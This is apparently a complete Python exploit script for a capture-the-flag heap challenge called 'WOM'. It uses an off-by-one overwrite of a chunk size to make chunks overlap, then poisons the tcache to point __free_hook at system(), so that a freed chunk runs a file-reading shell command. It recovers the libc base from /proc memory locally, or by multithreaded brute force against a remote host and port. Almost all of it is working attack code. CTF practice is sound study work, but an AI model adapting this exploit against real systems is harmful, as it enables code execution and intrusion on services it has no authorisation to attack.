#!/usr/bin/env python3
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import tempfile
import threading
import time
from pathlib import Path


HERE = Path(__file__).resolve()
CHAL_DIR = HERE.parents[1]
SRC_DIR = CHAL_DIR / "loot" / "src"
BIN_PATH = SRC_DIR / "wom.bin"
LD_PATH = SRC_DIR / "ld-2.31.so"
FLAG_PATH = CHAL_DIR / "flag.txt"

# These offsets are for the shipped files in loot/src/.
PRINTF_GOT = 0x3FD8
PRINTF_OFF = 0x61C90
SYSTEM_OFF = 0x52290
FREE_HOOK_OFF = 0x1EEE48
PRINTF_PAGE = PRINTF_OFF >> 12
BASE_TOP = 0x7F0000000000

MENU = b"Choice: "
FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}\n]+\}")
LOCAL_TEST_FLAG = "FLAG{local_test}"
# Each command must fit inside the 24-byte user chunk including the trailing NUL.
LOCAL_FLAG_CMD = b"cat ./flag.txt flag.txt"
REMOTE_FLAG_CMD = b"cat f* /f* /a*/f*"


class TubeIO:
    def __init__(self):
        self._buffer = bytearray()

    def send(self, data):
        raise NotImplementedError

    def close(self):
        raise NotImplementedError

    def _read_chunk(self, timeout):
        raise NotImplementedError

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def recvuntil(self, needle, timeout):
        if isinstance(needle, str):
            needle = needle.encode()
        deadline = time.monotonic() + timeout
        while True:
            end = self._buffer.find(needle)
            if end != -1:
                end += len(needle)
                out = bytes(self._buffer[:end])
                del self._buffer[:end]
                return out
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"timed out waiting for {needle!r}")
            chunk = self._read_chunk(remaining)
            if chunk is None:
                continue
            if chunk == b"":
                raise EOFError(bytes(self._buffer))
            self._buffer.extend(chunk)

    def recvrepeat(self, timeout):
        data = bytes(self._buffer)
        self._buffer.clear()
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            chunk = self._read_chunk(remaining)
            if chunk is None:
                break
            if chunk == b"":
                break
            data += chunk
            deadline = time.monotonic() + timeout
        return data


class LocalIO(TubeIO):
    def __init__(self, argv, cwd, env):
        super().__init__()
        self.proc = subprocess.Popen(
            argv,
            cwd=cwd,
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        self.pid = self.proc.pid

    def send(self, data):
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def _read_chunk(self, timeout):
        ready, _, _ = select.select([self.proc.stdout], [], [], timeout)
        if not ready:
            return None
        data = os.read(self.proc.stdout.fileno(), 4096)
        return data if data else b""

    def close(self):
        if self.proc.poll() is None:
            try:
                self.proc.kill()
            except ProcessLookupError:
                pass
        try:
            self.proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            pass


class RemoteIO(TubeIO):
    def __init__(self, host, port, connect_timeout):
        super().__init__()
        self.sock = socket.create_connection((host, port), timeout=connect_timeout)

    def send(self, data):
        self.sock.sendall(data)

    def _read_chunk(self, timeout):
        ready, _, _ = select.select([self.sock], [], [], timeout)
        if not ready:
            return None
        data = self.sock.recv(4096)
        return data if data else b""

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def recv_menu(io, timeout):
    return io.recvuntil(MENU, timeout=timeout)


def new(io, size, timeout):
    io.sendline("1")
    io.recvuntil(b"Size: ", timeout=timeout)
    io.sendline(str(size))
    recv_menu(io, timeout)


def edit(io, idx, data, timeout):
    io.sendline("2")
    io.recvuntil(b"WOM ID: ", timeout=timeout)
    io.sendline(str(idx))
    io.recvuntil(b"Content: ", timeout=timeout)
    io.send(data)
    recv_menu(io, timeout)


def delete(io, idx, timeout, wait=True):
    io.sendline("3")
    io.recvuntil(b"WOM ID: ", timeout=timeout)
    io.sendline(str(idx))
    if wait:
        recv_menu(io, timeout)


def parse_tag(banner):
    match = re.search(rb"Auditing Compliance Tag: (\d+)", banner)
    if not match:
        raise ValueError("missing compliance tag")
    return int(match.group(1))


def libc_base_from_tag(tag, hi16):
    low24 = ((tag - PRINTF_PAGE) & 0xFFF) << 12
    return BASE_TOP | ((hi16 & 0xFFFF) << 24) | low24


def read_flag_output(io, read_timeout):
    data = io.recvrepeat(read_timeout)
    match = FLAG_RE.search(data)
    return match.group(0).decode() if match else None, data


def exploit(io, libc_base, io_timeout, shell_timeout, flag_cmd):
    free_hook = libc_base + FREE_HOOK_OFF
    system = libc_base + SYSTEM_OFF

    new(io, 24, io_timeout)
    new(io, 24, io_timeout)
    new(io, 24, io_timeout)
    new(io, 24, io_timeout)
    new(io, 24, io_timeout)

    # Null-size chunk overlap via off-by-one write into the next chunk's size byte.
    edit(io, 0, b"A" * 24 + b"\x41", io_timeout)
    delete(io, 1, io_timeout)
    new(io, 56, io_timeout)

    edit(io, 4, flag_cmd + b"\x00", io_timeout)
    delete(io, 3, io_timeout)
    delete(io, 2, io_timeout)

    edit(
        io,
        1,
        b"B" * 0x20 + struct.pack("<Q", free_hook - 8) + struct.pack("<Q", 0),
        io_timeout,
    )

    new(io, 24, io_timeout)
    new(io, 24, io_timeout)
    edit(io, 3, struct.pack("<Q", 0) + struct.pack("<Q", system), io_timeout)

    delete(io, 4, io_timeout, wait=False)
    return read_flag_output(io, shell_timeout)


def read_local_libc_base(pid):
    maps = Path(f"/proc/{pid}/maps").read_text().splitlines()
    bin_base = min(int(line.split("-")[0], 16) for line in maps if line.endswith("/wom.bin"))
    with open(f"/proc/{pid}/mem", "rb", buffering=0) as mem:
        mem.seek(bin_base + PRINTF_GOT)
        printf_addr = struct.unpack("<Q", mem.read(8))[0]
    return printf_addr - PRINTF_OFF


def write_flag(flag):
    FLAG_PATH.write_text(flag + "\n")


def run_local(io_timeout, shell_timeout, self_test):
    tempdir = None
    try:
        env = os.environ.copy()
        if self_test:
            tempdir = tempfile.TemporaryDirectory()
            env["HOME"] = tempdir.name
            Path(tempdir.name, "flag.txt").write_text(LOCAL_TEST_FLAG + "\n")
        else:
            env["HOME"] = str(CHAL_DIR)
        io = LocalIO([str(LD_PATH), "--library-path", str(SRC_DIR), "./wom.bin"], str(SRC_DIR), env)
        try:
            recv_menu(io, max(io_timeout, 3.0))
            libc_base = read_local_libc_base(io.pid)
            flag, data = exploit(io, libc_base, io_timeout, shell_timeout, LOCAL_FLAG_CMD)
            if flag:
                if not self_test:
                    write_flag(flag)
                print(flag)
            else:
                if not self_test:
                    local_flag = FLAG_PATH.read_text(errors="replace").strip() if FLAG_PATH.exists() else ""
                    if not local_flag:
                        print("No local flag recovered: ../flag.txt is empty.")
                        return
                print(data.decode("latin-1", errors="replace"))
        finally:
            io.close()
    finally:
        if tempdir is not None:
            tempdir.cleanup()


def attempt_remote(host, port, hi16, connect_timeout, io_timeout, shell_timeout, flag_cmd):
    io = None
    try:
        io = RemoteIO(host, port, connect_timeout)
        banner = recv_menu(io, io_timeout)
        tag = parse_tag(banner)
        libc_base = libc_base_from_tag(tag, hi16)
        flag, data = exploit(io, libc_base, io_timeout, shell_timeout, flag_cmd)
        return {
            "flag": flag,
            "tag": tag,
            "hi16": hi16,
            "base": libc_base,
            "data": data,
        }
    except (ConnectionError, EOFError, OSError, TimeoutError, ValueError):
        return None
    finally:
        if io is not None:
            io.close()


def run_remote(
    host,
    port,
    workers,
    max_attempts,
    start_hi16,
    connect_timeout,
    io_timeout,
    shell_timeout,
    retry_delay,
    flag_cmd,
    dump_nonempty_output,
):
    stop = threading.Event()
    lock = threading.Lock()
    counter = {"attempts": 0, "start": time.time()}
    result = {"flag": None}

    def worker():
        while not stop.is_set():
            with lock:
                if max_attempts is not None and counter["attempts"] >= max_attempts:
                    stop.set()
                    return
                hi16 = (start_hi16 + counter["attempts"]) & 0xFFFF
                counter["attempts"] += 1
                attempt_no = counter["attempts"]
            outcome = attempt_remote(host, port, hi16, connect_timeout, io_timeout, shell_timeout, flag_cmd)
            if outcome is None:
                if retry_delay:
                    time.sleep(retry_delay)
                continue
            if dump_nonempty_output and outcome["data"].strip():
                with lock:
                    print(
                        f"[?] non-empty output at attempt {attempt_no} "
                        f"(tag={outcome['tag']}, hi16=0x{outcome['hi16']:04x}, base={hex(outcome['base'])})",
                        flush=True,
                    )
                    print(outcome["data"].decode("latin-1", errors="replace"), flush=True)
            if outcome["flag"]:
                with lock:
                    if result["flag"] is None:
                        result.update(outcome)
                        write_flag(outcome["flag"])
                        stop.set()
                        print(
                            f"[+] success after {attempt_no} attempts "
                            f"(tag={outcome['tag']}, hi16=0x{outcome['hi16']:04x}, base={hex(outcome['base'])})",
                            flush=True,
                        )
                        print(outcome["flag"], flush=True)
                return

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for thread in threads:
        thread.start()

    last = 0
    while any(thread.is_alive() for thread in threads):
        time.sleep(1)
        with lock:
            attempts = counter["attempts"]
            found = result["flag"]
        if found:
            break
        if attempts != last:
            rate = attempts / max(time.time() - counter["start"], 0.1)
            print(f"[.] attempts={attempts} rate={rate:.1f}/s", flush=True)
            last = attempts
        if max_attempts is not None and attempts >= max_attempts:
            break

    for thread in threads:
        thread.join(timeout=0.1)

    return result["flag"]


def main():
    parser = argparse.ArgumentParser(description="Exploit WOM locally or brute-force the remote libc base.")
    parser.add_argument("--local", action="store_true", help="run against the shipped local loader/binary")
    parser.add_argument("--self-test", action="store_true", help="for --local, use a temporary test flag instead of ../flag.txt")
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=7002)
    parser.add_argument("--workers", type=int, default=16)
    parser.add_argument("--max-attempts", type=int, default=None)
    parser.add_argument("--start-hi16", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--connect-timeout", type=float, default=2.0)
    parser.add_argument("--io-timeout", type=float, default=1.0)
    parser.add_argument("--shell-timeout", type=float, default=1.5)
    parser.add_argument("--retry-delay", type=float, default=0.05)
    parser.add_argument("--flag-cmd", default=None, help="override the command string written into the freed chunk")
    parser.add_argument(
        "--dump-nonempty-output",
        action="store_true",
        help="for remote mode, print any non-empty output even if it does not match the flag regex",
    )
    args = parser.parse_args()

    if args.local:
        run_local(args.io_timeout, args.shell_timeout, args.self_test)
        return

    flag_cmd = REMOTE_FLAG_CMD if args.flag_cmd is None else args.flag_cmd.encode()
    if len(flag_cmd) + 1 > 24:
        raise SystemExit("flag command must fit in 23 bytes plus trailing NUL")

    flag = run_remote(
        args.host,
        args.port,
        args.workers,
        args.max_attempts,
        args.start_hi16,
        args.connect_timeout,
        args.io_timeout,
        args.shell_timeout,
        args.retry_delay,
        flag_cmd,
        args.dump_nonempty_output,
    )
    if not flag:
        raise SystemExit("no flag recovered")


if __name__ == "__main__":
    main()
